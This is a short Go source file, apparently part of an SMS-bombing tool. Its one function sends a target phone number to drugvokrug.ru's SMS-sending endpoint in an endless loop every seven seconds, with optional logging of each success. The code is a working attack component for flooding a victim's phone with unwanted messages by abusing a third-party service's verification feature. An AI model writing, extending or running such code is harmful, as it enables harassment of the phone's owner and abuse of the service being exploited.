package main

import (
	"strings"
	"time"

	"github.com/valyala/fasthttp"
)

func drugvokrug() {
	req := newreq()
	req.SetBodyString("cell=" + num)
	req.SetRequestURI("https://drugvokrug.ru/siteActions/processSms.htm")
	req.Header.SetMethod("POST")

	timeout := time.Second * 7
	if logging > 0 {
		var err error
		res := &fasthttp.Response{}

		for do {
			err = client.Do(req, res)

			if err == nil && strings.Index(string(res.Body()), `success":true`) != -1 {
				okLog(smsLog)
			} else {
				errLog(smsLog)
			}
			time.Sleep(timeout)
		}
	} else {
		for do {
			client.Do(req, nil)
			time.Sleep(timeout)
		}
	}
}
